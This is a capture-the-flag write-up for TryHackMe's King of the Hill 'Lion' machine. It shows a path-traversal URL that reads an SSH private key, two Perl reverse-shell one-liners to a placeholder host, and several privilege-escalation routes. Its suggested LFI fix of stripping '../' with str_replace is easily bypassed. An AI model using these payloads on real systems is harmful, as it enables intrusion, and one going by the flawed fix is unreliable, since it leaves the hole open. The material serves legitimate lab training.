---
title: TryHackMe KoTH - Lion
author: trevohack
date: 2023-08-19 11:33:00 +0800 
categories: [TryHackMe, King Of The Hill, Linux]
tags: [hacking, koth, linux, thm]
pin: true
math: true
mermaid: true
---

# Pwning Lion

In this challenge, we will explore the steps to conquer the Lion machine in TryHackMe's King of the Hill. We'll outline the key exploits and tactics used to gain access to various user accounts.

## Exploiting Vulnerabilities

### Exploiting Port 8080

To exploit port 8080, we use the `exploit/multi/http/nostromo_code_exec` module in Metasploit. More details about this exploit can be found at [Exploit-DB](https://www.exploit-db.com/exploits/47837). This allows us to gain access as the user `gloria`.

### Accessing Gloria's SSH Key

On port 5555, we use the following URL: `:5555/?page=../../../../../../home/gloria/.ssh/id_rsa` to retrieve Gloria's SSH private key (`id_rsa`).

### Uploading a Perl Reverse Shell

Port 80 provides an opportunity to upload a Perl reverse shell file, allowing us to access the system as the user `alex`.

Here's a sample Perl reverse shell command:
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"lhost:lport");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Rooting the System

Here are some methods to escalate privileges and root the Lion machine:

### Hijacking a Root Tmux Session

Users can hijack a tmux session used by the root user by setting `export TMUX=/.dev/session,1234,0`.

### Running `pip3` as Alex

The user `alex` has sudo privileges to run `pip3`, providing an avenue to escalate privileges.

### Alternative Root Access

An alternative method to obtain root access is provided by the vulnerability detailed in [CVE-2017-16995](https://github.com/gugronnier/CVE-2017-16995).

## Patching and Security Measures

To secure the system and prevent further exploitation, consider these actions:

### Killing the Nostromo Service

Kill the `nostromo` service (also known as `nhttpd`) to stop the initial exploit vector.

### Editing LFI Vulnerabilities

Edit the Local File Inclusion (LFI) vulnerabilities by using input validation. For example:
```php
<?php include(str_replace("../","",$_GET["page"])); ?>
<?php include(str_replace("/etc/","",$_GET["page"])); ?>
<?php include(str_replace("id_rsa","",$_GET["page"])); ?>
```

### Session Termination

Terminate sessions with `w` or `puny` using the command `pkill -t -9 pts/[id]`.

### Custom Bashrc Configuration

Consider configuring a custom `.bashrc` file to enhance security.

## Flags and Important Paths

Here are the locations of important files and flags on the Lion machine:

- `/home/alex/user.txt`: Encrypted with ROT13
- `/root/.flag`
- `/home/marty/user.txt`: Text is reversed
- `/home/gloria/user.txt`
- User table in the blog database

# Thank You!
